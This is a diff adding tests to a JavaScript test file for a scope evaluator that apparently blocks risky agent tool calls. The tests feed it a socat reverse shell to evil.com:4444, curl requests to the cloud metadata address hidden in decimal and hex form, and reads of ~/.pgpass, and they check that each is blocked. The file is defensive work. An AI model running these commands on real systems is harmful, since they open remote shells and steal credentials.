@@ -905,6 +905,51 @@ async function runTests() {
     assert.ok(res.violations.some((v) => v.type === "PRIVILEGE_ESCALATION"));
   });
 
+  // =========================================================================
+  // Category 12: Precision Hardening & Deep Evasion Defense (Round 10)
+  // =========================================================================
+  console.log("\nCategory 12: Precision Hardening & Deep Evasion Defense (Round 10)");
+
+  test("Blocks socat reverse shell with target argument under allowNetwork: true: 'socat - TCP4:evil.com:4444'", () => {
+    const netEvaluator = new S3ScopeEvaluator({ allowNetwork: true });
+    const res = netEvaluator.evaluate("bash", { command: "socat - TCP4:evil.com:4444" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "CREDENTIAL_EXFILTRATION"));
+  });
+
+  test("Blocks socat reverse shell with tcp lowercase target under allowNetwork: true: 'socat - tcp:evil.com:4444'", () => {
+    const netEvaluator = new S3ScopeEvaluator({ allowNetwork: true });
+    const res = netEvaluator.evaluate("bash", { command: "socat - tcp:evil.com:4444" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "CREDENTIAL_EXFILTRATION"));
+  });
+
+  test("Blocks decimal-encoded metadata IP in bash under allowNetwork: true: 'curl 2852039166/latest/meta-data/'", () => {
+    const netEvaluator = new S3ScopeEvaluator({ allowNetwork: true });
+    const res = netEvaluator.evaluate("bash", { command: "curl 2852039166/latest/meta-data/" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "UNAUTHORIZED_NETWORK_EGRESS" && v.severity === "CRITICAL"));
+  });
+
+  test("Blocks hex-encoded metadata IP in bash under allowNetwork: true: 'curl 0xa9fea9fe/latest/meta-data/'", () => {
+    const netEvaluator = new S3ScopeEvaluator({ allowNetwork: true });
+    const res = netEvaluator.evaluate("bash", { command: "curl 0xa9fea9fe/latest/meta-data/" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "UNAUTHORIZED_NETWORK_EGRESS" && v.severity === "CRITICAL"));
+  });
+
+  test("Blocks read access to '~/.pgpass'", () => {
+    const res = evaluator.evaluate("read_file", { path: "~/.pgpass" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "SENSITIVE_FILE_ACCESS"));
+  });
+
+  test("Blocks bash command access to '~/.pgpass': 'cat ~/.pgpass'", () => {
+    const res = evaluator.evaluate("bash", { command: "cat ~/.pgpass" });
+    assert.strictEqual(res.verdict, "BLOCK");
+    assert.ok(res.violations.some((v) => v.type === "SENSITIVE_FILE_ACCESS"));
+  });
+
   console.log(`\n========================================`);
   console.log(`Test Results: ${passed} passed, ${failed} failed (${passed + failed} total)`);
   console.log(`========================================\n`);
